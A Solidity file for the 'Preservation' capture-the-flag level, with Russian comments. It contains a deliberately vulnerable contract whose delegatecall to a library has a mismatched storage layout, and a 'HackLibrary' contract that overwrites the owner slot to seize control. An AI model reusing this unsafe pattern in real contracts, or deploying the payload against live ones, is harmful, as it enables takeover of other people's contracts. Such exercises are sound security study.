// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
Этот контракт использует библиотеку для хранения времени. 

Конструктор получает экземпляр для хранения времени. 

Цель этого уровня — заявить права владения предоставленным вам экземпляром.

Вспомни как работает delegatecall и приведение типов в solidity
*/

contract Preservation {
    // контракты с публичной библиотекой
    address public timeZoneLibrary;
    address public owner;
    uint storedTime;
    // Устанавливает сигнатуру функции для вызова delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZoneLibraryAddress, address _owner) {
        timeZoneLibrary = _timeZoneLibraryAddress;
        owner = _owner;
    }

    // установить время для часового пояса
    function setTime(uint _timeStamp) public {
        timeZoneLibrary.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Простой библиотечный контракт для установки времени
contract LibraryContract {
    // хранит временную метку
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

contract HackLibrary {
    // хранит временную метку
    uint storedTime;
    address public owner;

    function setTime(uint _time) public {
        storedTime = _time;
        owner = msg.sender;
    }
}
    